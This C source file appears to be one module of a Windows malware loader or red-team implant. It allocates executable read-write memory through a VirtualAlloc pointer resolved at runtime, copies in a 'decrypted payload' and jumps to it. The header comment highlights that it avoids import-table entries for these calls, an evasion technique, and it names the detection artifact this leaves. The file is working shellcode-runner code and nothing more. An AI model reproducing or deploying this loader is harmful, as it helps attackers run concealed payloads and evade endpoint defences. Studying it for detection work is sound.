/*
 * Memory execution — Windows.
 *
 * Allocates RWX memory via the runtime-resolved VirtualAlloc pointer,
 * copies the decrypted payload, and jumps. No direct Win32 calls; no
 * IAT imports for VirtualAlloc/VirtualFree.
 *
 * Detection artifact: RWX private allocation + unbacked-code execution.
 */

#ifdef _WIN32

#include "mem_exec.h"
#include "api_table.h"

#include <windows.h>

static void mem_copy(void *dst, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    for (size_t i = 0; i < n; i++) d[i] = s[i];
}

int mem_run(const uint8_t *code, size_t len)
{
    if (!code || len == 0 || !g_api.VirtualAlloc || !g_api.VirtualFree) {
        return -1;
    }

    void *mem = g_api.VirtualAlloc(
        NULL, len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    if (!mem) return -1;

    mem_copy(mem, code, len);

    void (*entry)(void) = (void (*)(void))mem;
    entry();

    g_api.VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}

#endif /* _WIN32 */
